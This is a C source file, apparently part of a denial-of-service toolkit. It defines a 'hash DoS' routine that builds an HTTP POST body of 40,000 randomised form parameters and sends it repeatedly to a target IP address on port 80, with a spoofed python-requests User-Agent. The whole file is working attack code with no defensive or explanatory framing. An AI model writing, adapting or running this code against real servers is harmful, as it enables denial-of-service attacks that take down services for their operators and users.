#include "../header.h"
#include "../base/make_ipv4.h"
#include "../ddos/hash_dos.h"

void hash_dos_print_usage(void)
{
	printf("Hash Dos Usage : [Src-IP] [Dest-IP] [# requests] \n");
}

void hash_dos_run(char *argv[]) {
	char hash_src_ip[20];
	char hash_dest_ip[20];
	int conn_dest_port = 80;

	int requests;

	char content[800001];
	char randoms[10];
	char method[800300];

	srand(time(NULL));

	int argc = 0;
	while(argv[argc] != NULL){
		argc++;
	}

	if (argc != 3){
		hash_dos_print_usage();
		return;
	}

	strcpy(hash_src_ip, argv[0]);
	strcpy(hash_dest_ip, argv[1]);

	requests = atoi(argv[2]);

	memset(content, '\0', sizeof(content));
	
	char arg[20] = "arrrarrarrarrAaAa=1&";

	for(int i = 0; i < 40000; i++){
		arg[13] = rand() % 26 + 'A';
		arg[14] = rand() % 26 + 'a';
		arg[15] = rand() % 26 + 'A';
		arg[16] = rand() % 26 + 'a';
		strcat(content, arg);
	}

	sprintf(method, "POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: python-requests/2.22.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n",
		hash_src_ip, (int)sizeof(content));

	sprintf(method+strlen(method), "%s\r\n", content);

	for(int i = 0; i < requests; i++){

		int sock;
		if((sock = socket(PF_INET, SOCK_STREAM, 0)) < 0){
			fprintf(stderr, "socket error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		struct sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(80);
		addr.sin_addr.s_addr = inet_addr(hash_dest_ip);

		if(connect(sock,(struct sockaddr *)&addr,sizeof(addr)) < 0)
		{
			fprintf(stderr, "connect error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		if(send(sock, method, strlen(method), 0) < 0){
			fprintf(stderr, "send error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		close(sock);

	}

	return;

}
